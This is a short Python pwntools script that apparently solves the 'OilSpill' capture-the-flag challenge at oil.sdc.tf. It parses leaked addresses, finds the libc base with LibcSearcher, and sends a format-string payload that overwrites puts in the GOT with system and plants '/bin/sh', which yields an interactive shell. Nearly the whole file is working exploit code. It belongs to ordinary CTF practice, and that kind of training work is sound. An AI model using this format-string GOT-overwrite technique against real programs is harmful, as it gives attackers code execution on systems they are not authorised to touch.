from pwn import *
import sys
from LibcSearcher import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['wt.exe', '-w', '0', 'split-pane', 'wsl.exe', '-d', 'Ubuntu']
puts_got = 0x600C18

if sys.argv[1] == 'remote':
    p = remote('oil.sdc.tf', 1337)
else:
    p = process('./OilSpill')
    gdb.attach(p, '''
        b *0x4006d6
        ''')

puts_addr = int(p.recvuntil(b",", drop=True), 16)
log.info("puts_addr: " + hex(puts_addr))
printf_addr = int(p.recvuntil(b",", drop=True).strip(), 16)
log.info("printf_addr: " + hex(printf_addr))
stackvar_addr = int(p.recvuntil(b",", drop=True).strip(), 16)
log.info("stackvar_addr: " + hex(stackvar_addr))
temp_addr = int(p.recvuntil(b"\n", drop=True).strip(), 16)
log.info("temp_addr: " + hex(temp_addr))

libc = LibcSearcher(symbol_name='puts', address=puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
log.info("libc_base: " + hex(libc_base))
system_addr = p64(system_addr)

# the offset is get by using `AAAAAAAA%p-1,%p-2...` in format string testing
payload = fmtstr_payload(8, {0x600c80: b'/bin/sh\x00', puts_got: system_addr})
p.recvuntil(b"do you have any ideas of what we can use to clean it?")
pause()
p.sendline(payload)

p.interactive()
